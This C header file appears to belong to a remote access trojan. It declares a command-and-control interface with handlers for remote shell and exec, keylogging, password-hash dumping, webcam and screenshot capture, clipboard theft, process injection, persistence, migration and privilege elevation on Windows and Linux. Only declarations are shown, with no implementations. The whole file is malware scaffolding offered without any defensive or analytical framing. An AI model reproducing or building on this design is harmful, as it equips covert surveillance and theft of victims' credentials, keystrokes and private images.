/*
 * Command Execution Interface
 */

#ifndef COMMANDS_H
#define COMMANDS_H

#include <stdint.h>
#include <stddef.h>
#include "config.h"

// Command IDs
typedef enum {
    CMD_NOP = 0x00,
    CMD_PING = 0x01,
    CMD_EXEC = 0x02,
    CMD_DOWNLOAD = 0x03,
    CMD_UPLOAD = 0x04,
    CMD_SYSINFO = 0x05,
    CMD_PS_LIST = 0x06,
    CMD_KILL = 0x07,
    CMD_SCREENSHOT = 0x08,
    CMD_KEYLOG_START = 0x09,
    CMD_KEYLOG_STOP = 0x0A,
    CMD_KEYLOG_DUMP = 0x0B,
    CMD_INJECT = 0x0C,
    CMD_PERSIST = 0x0D,
    CMD_MIGRATE = 0x0E,
    CMD_KILLSWITCH = 0x0F,
    CMD_SHELL = 0x10,
    CMD_CD = 0x11,
    CMD_PWD = 0x12,
    CMD_LS = 0x13,
    CMD_CAT = 0x14,
    CMD_MKDIR = 0x15,
    CMD_RM = 0x16,
    CMD_MV = 0x17,
    CMD_WEBCAM = 0x18,
    CMD_ELEVATE = 0x19,
    CMD_HASHDUMP = 0x1A,
    CMD_CLIPBOARD = 0x1B,
    CMD_NETWORK = 0x1C,
    CMD_REGISTRY = 0x1D,
    CMD_SERVICE = 0x1E,
    CMD_UPDATE = 0x1F
} command_id_t;

// Command handler function type
typedef int (*cmd_handler_t)(const uint8_t* args, size_t args_len, 
                            uint8_t* output, size_t* output_len);

// Command structure
typedef struct {
    command_id_t id;
    const char* name;
    cmd_handler_t handler;
    uint32_t flags;
} command_t;

// Command execution
int execute_command(command_id_t cmd_id, const uint8_t* args, size_t args_len,
                   uint8_t* output, size_t* output_len);

// Built-in command handlers
int cmd_ping(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_exec(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_sysinfo(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_ps_list(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_download(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_upload(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_inject(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_persist(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_killswitch(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
int cmd_shell(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);

// Platform-specific implementations
#ifdef PLATFORM_WINDOWS
int execute_command_windows(const char* cmd, char* output, size_t output_size);
int inject_process_windows(const uint8_t* payload, size_t size, uint32_t pid);
int install_persistence_windows(void);
#endif

#ifdef PLATFORM_LINUX
int execute_command_linux(const char* cmd, char* output, size_t output_size);
int inject_process_linux(const uint8_t* payload, size_t size, uint32_t pid);
int install_persistence_linux(void);
#endif

// Process management
typedef struct {
    uint32_t pid;
    uint32_t ppid;
    char name[256];
    char path[512];
} process_info_t;

int enumerate_processes(process_info_t** processes, size_t* count);
int terminate_process(uint32_t pid);
int get_current_process_id(void);

// File operations
int file_exists(const char* path);
int file_read(const char* path, uint8_t** data, size_t* size);
int file_write(const char* path, const uint8_t* data, size_t size);
int file_delete(const char* path);
int directory_list(const char* path, char*** files, size_t* count);
int directory_create(const char* path);

#endif // COMMANDS_H